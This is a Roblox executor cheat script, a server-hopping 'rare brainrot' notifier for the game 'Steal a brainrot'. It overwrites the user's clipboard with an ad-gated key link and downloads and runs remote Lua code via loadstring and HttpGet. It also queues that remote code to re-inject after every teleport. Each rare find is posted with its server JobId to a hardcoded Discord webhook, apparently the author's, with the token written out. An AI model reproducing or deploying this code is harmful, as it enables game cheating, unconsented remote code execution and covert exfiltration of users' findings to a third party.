-- Copy key system link to clipboard
pcall(function()
    setclipboard("https://link-center.net/1375465/YAC3CDe8HuMX")
end)

-- Load Rayfield
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

-- Services
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Script reinjection
local scriptURL = "https://raw.githubusercontent.com/bypassv5/SabChecker/refs/heads/main/test.lua"
if queue_on_teleport then
    queue_on_teleport("loadstring(game:HttpGet('"..scriptURL.."'))()")
end

-- Constants
local originalWebhook = "https://discord.com/api/webhooks/1398765862835458110/yPDUCwGfwrDAkV9y1LwKDbawWTUWLE6810Y2Dh732FnKG1UiIgLnsMrSAJ3-opRkAAHu"
local rareBrainrots = {
	"La Vacca Saturno Saturnita",
	"Los Tralaleritos",
	"Graipuss Medussi",
	"La Grande Combinasion"
}

-- Rayfield Setup
local Window = Rayfield:CreateWindow({
	Name = "Rare Brainrot Notifier",
	LoadingTitle = "Loading Rare Brainrot Notifier...",
	ConfigurationSaving = {
		Enabled = true,
		FolderName = "BrainrotConfig",
		FileName = "RareSettings"
	},
	KeySystem = true,
	KeySettings = {
		Title = "Steal a brainrot finder",
		Subtitle = "Key System",
		Note = "Key copied to clipboard. If not, get it here:\nhttps://link-center.net/1375465/YAC3CDe8HuMX",
		FileName = "BrainrotKey",
		SaveKey = true,
		Key = { "8MWlRfVTijY88Lk43h59ofCnC0iuxhoc" }
	}
})

local Tab = Window:CreateTab("Main")

-- Toggles
local stopOnRare = false
local running = false

Tab:CreateToggle({
	Name = "Stop on rare brainrot",
	CurrentValue = false,
	Callback = function(v)
		stopOnRare = v
	end
})

Tab:CreateToggle({
	Name = "Start Hopping",
	CurrentValue = false,
	Callback = function(v)
		running = v
		if v then
			task.spawn(function()
				while running do
					local found = {}
					for _, name in ipairs(rareBrainrots) do
						if workspace:FindFirstChild(name) then
							table.insert(found, name)
						end
					end

					if #found > 0 then
						local message = "@everyone\nRare brainrots found:\n- " .. table.concat(found, "\n- ") ..
							"\n\nJobId: `" .. game.JobId .. "`\nJoin:\n`game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" ..
							game.PlaceId .. ', "' .. game.JobId .. '")`'

						pcall(function()
							local req = (syn and syn.request) or http_request or (fluxus and fluxus.request)
							if req then
								req({
									Url = originalWebhook,
									Method = "POST",
									Headers = {["Content-Type"] = "application/json"},
									Body = HttpService:JSONEncode({content = message})
								})
							end
						end)

						Rayfield:Notify({
							Title = "Rare Brainrot Found!",
							Content = table.concat(found, ", "),
							Duration = 8,
							Image = 4483362458
						})

						if stopOnRare then
							running = false
							break
						end
					end

					local servers = {}
					local success, data = pcall(function()
						return HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"))
					end)
					if success and data and data.data then
						for _, s in ipairs(data.data) do
							if s.playing == 1 and s.id ~= game.JobId then
								table.insert(servers, s.id)
							end
						end
					end

					if #servers >= 1 then
						TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[1], LocalPlayer)
						break
					end

					task.wait(1)
				end
			end)
		end
	end
})
